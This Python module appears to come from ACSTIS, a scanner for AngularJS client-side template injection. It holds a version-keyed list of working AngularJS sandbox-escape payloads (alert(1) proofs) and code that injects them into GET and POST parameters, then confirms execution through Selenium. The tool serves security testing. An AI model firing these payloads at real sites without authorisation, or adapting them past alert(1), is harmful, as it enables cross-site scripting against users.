# -*- coding: utf-8 -*-

# MIT License
#
# Copyright (c) 2017 Tijme Gommers
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

from urllib.parse import urlparse, urlencode, parse_qs, quote_plus
from urllib.request import urlopen
from bs4 import BeautifulSoup
from acstis.Selenium import Selenium

import copy
import requests
import html

class Exploit:

    payloads = [
        {
            "min": "1.0.0",
            "max": "1.1.5",
            "value": "{{constructor.constructor('alert(1)')()}}"
        },
        {
            "min": "1.2.0",
            "max": "1.2.1",
            "value": "{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}"
        },
        {
            "min": "1.2.2",
            "max": "1.2.5",
            "value": "{{a=\"a\"[\"constructor\"].prototype;a.charAt=a.trim;$eval('a\",alert(alert=1),\"')}}"
        },
        {
            "min": "1.2.6",
            "max": "1.2.18",
            "value": "{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}"
        },
        {
            "min": "1.2.19",
            "max": "1.2.23",
            "value": "{{c=toString.constructor;p=c.prototype;p.toString=p.call;[\"a\",\"alert(1)\"].sort(c)}}"
        },
        {
            "min": "1.2.24",
            "max": "1.2.32",
            "value": "{{a=\"a\"[\"constructor\"].prototype;a.charAt=a.trim;$eval('a\",alert(alert=1),\"')}}"
        },

        {
            "min": "1.3.0",
            "max": "1.3.0",
            "value": "{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a'.constructor.prototype.charAt=''.valueOf; $eval('x=alert(1)//');}}"
        },
        {
            "min": "1.3.1",
            "max": "1.3.2",
            "value": "{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a'.constructor.prototype.charAt=''.valueOf; $eval('x=alert(1)//');}}"
        },
        {
            "min": "1.3.3",
            "max": "1.3.18",
            "value": "{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)//');}}"
        },
        {
            "min": "1.3.19",
            "max": "1.3.19",
            "value": "{{'a'[{toString:false,valueOf:[].join,length:1,0:'__proto__'}].charAt=[].join;$eval('x=alert(1)//');}}"
        },
        {
            "min": "1.3.20",
            "max": "1.3.20",
            "value": "{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}"
        },
        {
            "min": "1.4.0",
            "max": "1.4.14",
            "value": "{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}"
        },
        {
            "min": "1.4.10",
            "max": "1.5.8",
            "value": "{{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x=alert(1)');}}"
        },
        {
            "min": "1.5.9",
            "max": "1.5.11",
            "value": "{{c=''.sub.call;b=''.sub.bind;a=''.sub.apply;c.$apply=$apply;c.$eval=b;op=$root.$$phase;$root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;C=c.$apply(c);$root.$$phase=op;$root.$digest=od;B=C(b,c,b);$evalAsync(\"astNode=pop();astNode.type='UnaryExpression';astNode.operator='(window.X?void0:(window.X=true,alert(1)))+';astNode.argument={type:'Identifier',name:'foo'};\");m1=B($$asyncQueue.pop().expression,null,$root);m2=B(C,null,m1);[].push.apply=m2;a=''.sub;$eval('a(b.c)');[].push.apply=a;}}"
        },
        {
            "min": "1.6.0",
            "max": "1.6.4",
            "value": "{{[].pop.constructor('alert(1)')()}}"
        }
    ]

    @staticmethod
    def is_vulnerable(queue_item, version, use_javascript_engine=False):
        get_params = Exploit.get_params(queue_item.request.url)
        post_params = queue_item.request.data if queue_item.request.data else []

        for param in get_params:
            for payload in Exploit.get_payloads(version):
                payload_params = copy.deepcopy(get_params)
                del payload_params[param]
                payload_params = urlencode(payload_params, doseq=True)

                host_url = queue_item.request.url.split('?')[0]
                full_url = host_url + "?" + payload_params

                if len(payload_params) > 0:
                    full_url = full_url + "&"

                full_urls = [
                    full_url + param + "=" + payload["value"],
                    full_url + param + "=" + quote_plus(payload["value"])
                ]

                for full_url in full_urls:
                    response = Exploit.make_request(full_url, queue_item.request.method, queue_item.request.data, queue_item.request.cookies, [])

                    if not Exploit.is_reflected(response.text, payload):
                        continue

                    if not Exploit.in_angular_scope(response.text, payload):
                        continue

                    vulnerable_item = copy.deepcopy(queue_item)
                    vulnerable_item.request.url = full_url

                    if use_javascript_engine and not Selenium.alert_is_popped(vulnerable_item):
                        continue

                    return vulnerable_item

        for param in post_params:
            for payload in Exploit.get_payloads(version):
                payload_params = copy.deepcopy(post_params)
                del payload_params[param]

                datas = [
                    payload["value"],
                    quote_plus(payload["value"])
                ]

                for data in datas:
                    payload_params[param] = data
                    response = Exploit.make_request(queue_item.request.url, queue_item.request.method, payload_params, queue_item.request.cookies, [])

                    if not Exploit.is_reflected(response.text, payload):
                        continue

                    if not Exploit.in_angular_scope(response.text, payload):
                        continue

                    vulnerable_item = copy.deepcopy(queue_item)
                    vulnerable_item.request.data = payload_params

                    if use_javascript_engine and not Selenium.alert_is_popped(vulnerable_item):
                        continue

                    return vulnerable_item

        return False

    @staticmethod
    def get_params(url):
        parsed = urlparse(url)
        return parse_qs(parsed.query)

    @staticmethod
    def get_payloads(version):
        requested_payloads = []

        for payload in Exploit.payloads:
            req_major, req_minor, req_patch = version.split(".")
            min_major, min_minor, min_patch = payload["min"].split(".")
            max_major, max_minor, max_patch = payload["max"].split(".")

            required = int(req_major.zfill(2) + req_minor.zfill(2) + req_patch.zfill(2))
            minimum = int(min_major.zfill(2) + min_minor.zfill(2) + min_patch.zfill(2))
            maximum = int(max_major.zfill(2) + max_minor.zfill(2) + max_patch.zfill(2))

            if required >= minimum and required <= maximum:
                requested_payloads.append(payload)

        return requested_payloads

    @staticmethod
    def make_request(url, method, data, cookies, headers):
        request_by_method = getattr(requests, method)
        return request_by_method(
            url=url,
            data=data,
            cookies=cookies,
            headers=headers,
            allow_redirects=True,
            stream=True
        )

    @staticmethod
    def is_reflected(contents, payload):
        if payload['value'] in html.unescape(contents):
            return True

        return payload['value'] in contents

    @staticmethod
    def in_angular_scope(contents, payload):
        soup = BeautifulSoup(contents, "html.parser")
        ng_app_contents = str(soup.select("[ng-app]"))

        if payload['value'] in html.unescape(ng_app_contents):
            return True

        return payload['value'] in ng_app_contents